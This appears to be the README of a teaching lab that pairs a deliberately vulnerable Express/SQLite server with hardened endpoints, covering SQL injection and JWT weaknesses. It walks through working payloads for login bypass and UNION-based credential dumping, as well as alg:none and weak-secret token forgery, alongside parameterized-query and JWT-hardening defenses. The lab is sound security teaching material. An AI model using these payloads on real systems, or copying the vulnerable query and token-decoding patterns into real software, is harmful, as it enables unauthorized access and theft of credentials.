# JWT-Hardenning

# Lab 2 – SQL Injection + JWT Vulnerabilities

This is an educational lab demonstrating SQL Injection attacks and JWT (JSON Web Token) authentication vulnerabilities alongside hardened defenses. The project includes a vulnerable Node.js/Express server that intentionally exposes these weaknesses for learning purposes.

**Disclaimer:** This lab is for educational use only. Do NOT use these patterns or practices in production systems.

---

## Project Structure

```
Lab 1/
├── server.js              # Express server (vulnerable and secure endpoints)
├── init-db.js             # SQLite database initialization script
├── public/
│   ├── index.html         # Frontend UI
│   ├── script.js          # Client-side form handlers
│   └── style.css          # Styling
├── use.env                # Environment template (copy to .env)
├── generate-secrets.js    # Utility to generate cryptographic secrets
├── package.json           # Dependencies
├── package-lock.json      # Locked dependency versions
└── payloads.txt           # Example SQL injection payloads
```

---

## Prerequisites

- **Node.js** (v12 or later) and **npm**
- **SQLite3** (usually installed with Node.js `sqlite3` package)
- **Postman** (recommended for API testing) or `curl`
- **Wireshark** (for traffic capture; optional but recommended)

---

## Setup Instructions

### 1. Navigate to the Lab Directory

```bash
cd "Lab 1"
```

### 2. Install Dependencies

```bash
npm install
```

If you encounter native module errors (e.g., SQLite3 compilation issues), try rebuilding:

```bash
npm rebuild
# or if that fails, reinstall sqlite3 from source
npm install --build-from-source sqlite3
```

### 3. Set Up Environment Variables

Copy the template file and generate secure secrets:

```bash
# Copy the template
cp use.env .env

# Generate cryptographically secure secrets
node generate-secrets.js
```

The output will show three secrets. Copy them into the `.env` file:

```bash
# Edit .env with your favorite editor
nano .env
# or
code .env
```

Example `.env` content after filling in generated secrets:

```
PORT=1234
DB_PATH=./users.db

ACCESS_TOKEN_SECRET=<paste_48_byte_hex_from_generate_secrets>
REFRESH_TOKEN_SECRET=<paste_48_byte_hex_from_generate_secrets>
WEAK_SECRET=<paste_16_byte_hex_from_generate_secrets>

TOKEN_ISSUER=lab-2.example
TOKEN_AUDIENCE=lab-2-students
ACCESS_TOKEN_LIFETIME=15m
REFRESH_TOKEN_LIFETIME=7d
```

### 4. Initialize the Database

```bash
npm run init-db
```

This creates `users.db` with three sample users:
- **admin** / `admin123`
- **alice** / `alicepass`
- **bob** / `bobpass`

### 5. Start the Server

```bash
npm start
```

You should see:

```
✅ Connected to SQLite DB at ./users.db
🚀 Server running at http://localhost:1234
```

Open http://localhost:1234 in your browser to access the frontend UI.

---

## API Endpoints

### Vulnerable Endpoints (DO NOT use in production)

#### `POST /vuln-login` – Vulnerable SQL Concatenation
- **Body:** `{"username": "string", "password": "string"}`
- **Behavior:** Constructs SQL via string concatenation, allowing SQL injection
- **Response:** Returns access and refresh tokens signed with `WEAK_SECRET` (no issuer/audience claims)

**Example:**
```bash
curl -X POST http://localhost:1234/vuln-login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'
```

#### `GET /vuln/admin-list` – Accepts Tokens Without Verification
- **Headers:** `Authorization: Bearer <token>`
- **Behavior:** Decodes token without verifying signature or issuer/audience
- **Vulnerability:** Accepts `alg: none` tokens and forged tokens

**Example:**
```bash
curl -X GET http://localhost:1234/vuln/admin-list \
  -H "Authorization: Bearer <token_from_vuln_login>"
```

### Secure Endpoints (Hardened)

#### `POST /login` – Parameterized Query (SQL Injection Protection)
- **Body:** `{"username": "string", "password": "string"}`
- **Behavior:** Uses parameterized SQL queries preventing injection
- **Response:** Returns access and refresh tokens signed with strong secret, includes `iss` and `aud` claims

**Example:**
```bash
curl -X POST http://localhost:1234/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'
```

#### `GET /admin/list-users` – Token Verification
- **Headers:** `Authorization: Bearer <token>`
- **Behavior:** Verifies token signature, issuer, audience, and expiry
- **Response:** Returns user list only if token is valid

**Example:**
```bash
curl -X GET http://localhost:1234/admin/list-users \
  -H "Authorization: Bearer <token_from_login>"
```

#### `POST /token` – Refresh Token Exchange
- **Body:** `{"refreshToken": "string"}`
- **Behavior:** Issues new access token, implements token rotation
- **Response:** New access and refresh tokens

#### `POST /logout` – Revoke Refresh Token
- **Body:** `{"refreshToken": "string"}`
- **Behavior:** Removes token from server-side store

---

## Reproducing Vulnerabilities

### Attack 1: SQL Injection via String Concatenation

**Vulnerable Endpoint:** `POST /vuln-login`

#### Step 1: Bypass Authentication

Try logging in with a SQL injection payload instead of a real password:

**Payload:**
```
username: admin
password: ' OR '1'='1
```

**Using curl:**
```bash
curl -X POST http://localhost:1234/vuln-login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"'"'"' OR '"'"'1'"'"'='"'"'1"}'
```

**Using Postman:**
1. Create a new POST request to `http://localhost:1234/vuln-login`
2. Set header `Content-Type: application/json`
3. Body (raw JSON):
   ```json
   {"username":"admin","password":"' OR '1'='1"}
   ```
4. Send and observe: Login succeeds even with wrong password

**Why it works:** The query becomes:
```sql
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1';
```

The `OR '1'='1'` clause is always true, so the query returns at least one row.

#### Step 2: Extract Database Information

**Payload to list database version:**
```
username: admin
password: ' UNION SELECT NULL, sqlite_version(), NULL--
```

**Using Postman:**
```json
{"username":"admin","password":"' UNION SELECT NULL, sqlite_version(), NULL--"}
```

**Why it works:** The query becomes:
```sql
SELECT * FROM users WHERE username = 'admin' AND password = '' UNION SELECT NULL, sqlite_version(), NULL--;
```

The `--` comments out the rest, and UNION returns database metadata.

#### Step 3: Dump User Credentials

**Payload to extract all user records:**
```
username: admin
password: ' UNION SELECT id, username, password FROM users--
```

**Using Postman:**
```json
{"username":"admin","password":"' UNION SELECT id, username, password FROM users--"}
```

**Expected Response:**
```json
{
  "success": true,
  "message": "VULN login success for user: admin",
  "accessToken": "...",
  "refreshToken": "...",
  "rows": [
    {"id": 1, "username": "admin", "password": "admin123"},
    {"id": 2, "username": "alice", "password": "alicepass"},
    {"id": 3, "username": "bob", "password": "bobpass"}
  ]
}
```

**Server Console Output:**
You'll see the exact SQL that was constructed:
```
🔴 [VULN] Constructed SQL: SELECT * FROM users WHERE username = 'admin' AND password = '' UNION SELECT id, username, password FROM users--';
```

---

### Attack 2: JWT `alg: none` Attack

**Vulnerable Endpoint:** `GET /vuln/admin-list`

#### Step 1: Generate a Token with `alg: none`

Use the provided utility:

```bash
node forge_token.js --alg none --sub admin
```

**Output:**
```
ALG NONE token:
 eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.
```

#### Step 2: Use the Forged Token Against the Vulnerable Endpoint

**Using curl:**
```bash
FORGED_TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9."

curl -X GET http://localhost:1234/vuln/admin-list \
  -H "Authorization: Bearer $FORGED_TOKEN"
```

**Using Postman:**
1. GET request to `http://localhost:1234/vuln/admin-list`
2. Headers tab: Add `Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.`
3. Send

**Expected Response (Vulnerable):**
```json
{
  "users": [
    {"id": 1, "username": "admin"},
    {"id": 2, "username": "alice"},
    {"id": 3, "username": "bob"}
  ],
  "acceptedAs": "admin",
  "note": "VULNERABLE: token was accepted without signature verification"
}
```

#### Step 3: Verify the Secure Endpoint Rejects It

Try the same token against `GET /admin/list-users`:

```bash
curl -X GET http://localhost:1234/admin/list-users \
  -H "Authorization: Bearer $FORGED_TOKEN"
```

**Expected Response (Secure):**
```json
{
  "error": "Invalid or expired access token"
}
```

**Why:** The secure endpoint calls `jwt.verify()` with algorithm restrictions and issuer/audience validation.

---

### Attack 3: Weak Secret Token Forgery

**Vulnerable Endpoint:** `GET /vuln/admin-list`

#### Step 1: Generate a Token Signed with WEAK_SECRET

```bash
node forge_token.js --alg weak --sub alice
```

**Output:**
```
Weak HMAC token (signed with WEAK_SECRET):
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsImlhdCI6MTcwMDAwMDAwMH0...
```

#### Step 2: Use the Forged Token

```bash
WEAK_TOKEN="<paste_token_from_above>"

curl -X GET http://localhost:1234/vuln/admin-list \
  -H "Authorization: Bearer $WEAK_TOKEN"
```

**Expected Result:**
Vulnerable endpoint accepts it (returns user list as "alice").

#### Step 3: Verify Secure Endpoint Rejects It

```bash
curl -X GET http://localhost:1234/admin/list-users \
  -H "Authorization: Bearer $WEAK_TOKEN"
```

**Expected Result:**
```json
{
  "error": "Invalid or expired access token"
}
```

---

## Capturing Traffic with Wireshark

### Setup

1. **Open Wireshark** and select the loopback interface:
   - **Linux/Mac:** `lo` (loopback)
   - **Windows:** `Loopback Pseudo-Interface` or `lo0`

2. **Start Capturing** (green shark icon or Ctrl+E)

3. **In another terminal, run a request:**
   ```bash
   curl -X POST http://localhost:1234/vuln-login \
     -H "Content-Type: application/json" \
     -d '{"username":"admin","password":"admin123"}'
   ```

### Useful Wireshark Filters

| Filter | Purpose |
|--------|---------|
| `tcp.port == 1234` | Show only traffic on port 1234 |
| `http` | Show all HTTP traffic |
| `http.request.method == "POST"` | Show only POST requests |
| `http.response.code == 200` | Show only successful responses |

### What to Observe

- **Unencrypted HTTP:** You'll see request/response bodies in cleartext, including:
  - Username and password in POST bodies
  - JWT tokens in Authorization headers
  - Credentials visible in Wireshark packet details

- **Recommendation:** In production, always use **HTTPS/TLS** to encrypt the channel and protect tokens and credentials from passive network eavesdropping.

---

## Defending Against These Attacks

### SQL Injection Defense: Parameterized Queries

**Vulnerable:**
```javascript
const sql = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "';";
db.all(sql, [], callback);
```

**Secure:**
```javascript
const sql = "SELECT * FROM users WHERE username = ? AND password = ?;";
db.get(sql, [username, password], callback);
```

The `?` placeholders ensure input is treated as data, not SQL code.

### JWT Security Hardening

| Issue | Mitigation |
|-------|-----------|
| No signature verification | Always call `jwt.verify()` with explicit algorithm and secret |
| Accepts `alg: none` | Restrict algorithms: `{ algorithms: ['HS256'] }` |
| Missing issuer/audience | Include and verify `iss` and `aud` claims |
| Weak secrets | Use cryptographically secure random secrets (≥32 bytes) |
| No token expiry | Set short access token lifetime and use refresh tokens |
| No token rotation | Implement server-side refresh token tracking and revocation |

---

## Assumptions & Limitations

### Assumptions

1. **Local Development Only:** This lab runs unencrypted HTTP on `localhost:1234`. Traffic is visible in plaintext.

2. **Plaintext Passwords:** Users are stored with plaintext passwords for simplicity. Production systems must use salted hashes (bcrypt, argon2, PBKDF2).

3. **In-Memory Refresh Token Store:** Refresh tokens are stored in a JavaScript `Map` that disappears on server restart. Production requires persistent storage (Redis, database) with proper expiry tracking.

4. **SQLite3:** A lightweight database suitable for demos. Production systems typically use PostgreSQL, MySQL, or cloud databases with proper access controls.

5. **No Input Validation:** The vulnerable endpoint intentionally omits validation. Production systems should validate and sanitize all inputs.

### Limitations

1. **Single Server Process:** Token rotation and revocation only work within one process. Multi-server deployments need centralized token blacklisting (e.g., Redis).

2. **No HTTPS/TLS:** HTTP traffic is unencrypted. Tokens and credentials are visible to network sniffers. Always use HTTPS in real systems.

3. **No Rate Limiting:** No protection against brute-force login attacks. Production deployments need rate limiting middleware.

4. **No Logging/Audit Trail:** Security events are only logged to the console. Production systems need centralized logging (ELK, Splunk, CloudWatch) for compliance and incident investigation.

5. **No CSRF Protection:** POST endpoints lack CSRF tokens. Web applications should include anti-CSRF measures (SameSite cookies, CSRF tokens).

6. **Database Permissions:** The lab runs with default SQLite permissions. Production databases should enforce role-based access control (RBAC) and least privilege.

---

## Common Issues & Troubleshooting

### Issue: `sqlite3` native module compilation fails

**Solution:**
```bash
# Option 1: Rebuild native modules
npm rebuild

# Option 2: Reinstall with build from source
npm install --build-from-source sqlite3

# Option 3: Clean and reinstall everything
rm -rf node_modules package-lock.json
npm install
```

### Issue: Port 1234 is already in use

**Solution:**
```bash
# Find and kill the process
lsof -i :1234
kill -9 <PID>

# Or change PORT in .env
```

### Issue: `.env` file is not found

**Solution:**
```bash
# Ensure you created it
cp use.env .env

# Verify it exists in the Lab 1 directory
ls -la .env
```

### Issue: Database is locked / `users.db` is corrupted

**Solution:**
```bash
# Remove the old database
rm users.db

# Reinitialize it
npm run init-db
```

### Issue: Tokens are being rejected despite being valid

**Check:**
1. Tokens from `/login` are signed with `ACCESS_TOKEN_SECRET` (strong secret)
2. Tokens from `/vuln-login` use `WEAK_SECRET`
3. Only tokens from `/login` work with `/admin/list-users`
4. Token lifetime: Access tokens expire after `ACCESS_TOKEN_LIFETIME` (default 15m)

---

## Running in Development Mode (Optional)

For faster development with hot-reload, install `nodemon` and run:

```bash
npx nodemon server.js
```

The server will restart automatically when you modify `server.js`.

---

## Further Learning

- **SQL Injection:** OWASP [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- **JWT:** [jwt.io](https://jwt.io) – Interactive JWT debugger and specification
- **OWASP Top 10:** [2021 Web Application Security Risks](https://owasp.org/Top10/)
- **Node.js Security:** [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)

---

## License

Educational/demonstration use only. Not for production.
